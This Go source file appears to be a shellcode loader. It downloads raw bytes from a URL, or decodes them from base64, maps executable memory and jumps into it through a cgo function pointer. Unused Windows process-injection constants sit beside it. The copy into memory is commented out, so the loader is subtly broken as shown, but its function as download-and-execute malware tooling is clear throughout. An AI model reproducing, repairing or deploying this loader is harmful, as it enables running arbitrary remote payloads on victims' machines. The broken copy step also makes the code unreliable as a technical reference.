package exec

/*
int call(char *code) {
    int (*ret)() = (int(*)())code;
	ret();
	return 0;
}
*/
import "C"
import (
	"bytes"
	"encoding/base64"
	"net/http"
	"time"
	"unsafe"

	mmap "github.com/edsrzf/mmap-go"
)

func ExecShellcodeFromWeb(addr string) {

	//buf := ""
	r, e := http.Get(addr)
	if e != nil {
		panic(e)
	}
	defer r.Body.Close()
	buff := &bytes.Buffer{}
	buff.ReadFrom(r.Body)
	body := buff.Bytes()
	ExecShellBytes(body)
}

const MEM_COMMIT = 0x1000
const MEM_RESERVE = 0x2000
const PAGE_EXECUTE_READWRITE = 0x40
const PROCESS_CREATE_THREAD = 0x0002
const PROCESS_QUERY_INFORMATION = 0x0400
const PROCESS_VM_OPERATION = 0x0008
const PROCESS_VM_WRITE = 0x0020
const PROCESS_VM_READ = 0x0010

func Execx86WinShellbytes(shellcode []byte) {
	//a, _, e := syscall.MustLoadDLL("kernel32.dll").MustFindProc("VirtualAlloc").Call(0, uintptr(len(shellcode)), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)

}

func ExecShellBytes(shellcode []byte) {
	b, e := mmap.MapRegion(nil, len(shellcode), mmap.EXEC|mmap.RDWR, mmap.ANON, int64(0))
	//a, _, e := syscall.MustLoadDLL("kernel32.dll").MustFindProc("VirtualAlloc").Call(0, uintptr(len(shellcode)), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)
	//b, e := syscall.Mmap(0, 0, len(shellcode), syscall.PROT_READ|syscall.PROT_WRITE|syscall.PROT_EXEC, syscall.MAP_ANON)
	if e != nil {
		//panic(e)
	}
	//ap := (*[99000]byte)(unsafe.Pointer(a))
	for i := 0; i < len(shellcode); i++ {
		//(*ap)[i] = shellcode[i]
	}
	//copy(b, shellcode)
	C.call((*C.char)(unsafe.Pointer(&b[0])))
	//syscall.Syscall(a, 0, 0, 0, 0)
	time.Sleep(5)
}

func ExecFromBase64(s string) error {
	b, e := base64.StdEncoding.DecodeString(s)
	if e != nil {
		return e
	}
	ExecShellBytes(b)
	return nil
}
